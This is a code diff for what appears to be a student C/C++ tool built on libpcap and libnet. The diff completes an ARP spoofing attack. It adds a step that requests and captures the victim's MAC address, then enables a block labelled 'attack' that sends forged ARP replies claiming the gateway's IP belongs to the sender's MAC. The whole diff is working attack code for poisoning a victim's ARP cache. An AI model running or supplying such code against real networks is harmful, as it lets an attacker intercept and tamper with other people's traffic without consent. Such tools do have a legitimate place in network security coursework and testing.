@@ -11,6 +11,7 @@
 #include <string.h>
 #include <unistd.h>
 #include <malloc.h>
+#include <libnet.h>
 
 //MAC주소 길이
 #define MAC_ALEN 6
@@ -57,7 +58,6 @@ int GetInterfaceMacAddress(const char *ifname, uint8_t *mac_addr, uint32_t* ip_a
         return -1;
     }
     memcpy(ip_addr, ifr.ifr_addr.sa_data, Ip::SIZE);
-    printf("%d", *ip_addr);
 
     close(sockfd);
     return 0;
@@ -73,6 +73,8 @@ int main(int argc, char* argv[]) {
     char* s_ip = argv[2];
     char* t_ip = argv[3];
 
+    EthArpPacket packet;
+
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
 	if (handle == nullptr) {
@@ -80,12 +82,14 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 
-    EthArpPacket packet;
+    char errbuf_2[PCAP_ERRBUF_SIZE];
+    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf_2);
+
     uint8_t MAC_ADD[Mac::SIZE];
     uint32_t IP_ADD;
     GetInterfaceMacAddress(dev, MAC_ADD, &IP_ADD);
 
-    //To get vicitm MAC address
+    //To get vicitm MAC address - arp request to victim
     packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
     packet.eth_.smac_ = Mac(MAC_ADD);
     packet.eth_.type_ = htons(EthHdr::Arp);
@@ -97,7 +101,7 @@ int main(int argc, char* argv[]) {
     packet.arp_.op_ = htons(ArpHdr::Request);
     packet.arp_.smac_ = Mac(MAC_ADD); //my MAC_ADD
     packet.arp_.sip_ = htonl(Ip("0.0.0.0")); //my ip - any ip in here can get reply packet
-    packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); //victim mac
+    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
     packet.arp_.tip_ = htonl(Ip(s_ip));  //victim ip
 
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
@@ -105,10 +109,37 @@ int main(int argc, char* argv[]) {
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
     }
 
-    /*
-    //printf("Success MAC : %02X:%02X:%02X:%02X:%02X:%02X\n", MAC_ADDR_FMT_ARGS(MAC_ADD));
+    while (true) {
+            struct pcap_pkthdr* header;
+            libnet_ethernet_hdr *eth_hdr;
+
+            const u_char* out_packet;
+
+            int res = pcap_next_ex(pcap, &header, &out_packet);
+            if (res == 0) continue;
+            if (res == -1 || res == -2) {
+                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
+                break;
+            }
+            //hdr
+            eth_hdr = (libnet_ethernet_hdr*)(out_packet);
+
+            if (ntohs(eth_hdr->ether_type) != ETHERTYPE_ARP){
+                continue;
+            }
+            EthArpPacket *arp_packet = (EthArpPacket *)out_packet;
+            if (arp_packet->arp_.op() == arp_packet->arp_.Reply && arp_packet->arp_.sip() == Ip(s_ip)){
+                printf("Victim Mac Address Captured success\n");
+                packet.arp_.tmac_ = arp_packet->arp_.smac();
+                packet.eth_.dmac_ = arp_packet->arp_.smac();
+                break;
+            }
+    }
+
+
     //attack
-    packet.eth_.dmac_ = Mac("B4:2E:99:EC:EB:DA");
+    printf("start arp attack");
+    //destination mac is defined (victim mac)
     packet.eth_.smac_ = Mac(MAC_ADD);
 	packet.eth_.type_ = htons(EthHdr::Arp);
 
@@ -119,14 +150,13 @@ int main(int argc, char* argv[]) {
     packet.arp_.op_ = htons(ArpHdr::Reply);
     packet.arp_.smac_ = Mac(MAC_ADD); //gateway mac to mine
     packet.arp_.sip_ = htonl(Ip(t_ip)); //gateway ip
-    packet.arp_.tmac_ = Mac("B4:2E:99:EC:EB:DA"); //victim mac
+    //victim mac is defined
     packet.arp_.tip_ = htonl(Ip(s_ip));  //victim ip
 
-	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 	}
-    */
 
 	pcap_close(handle);
 }
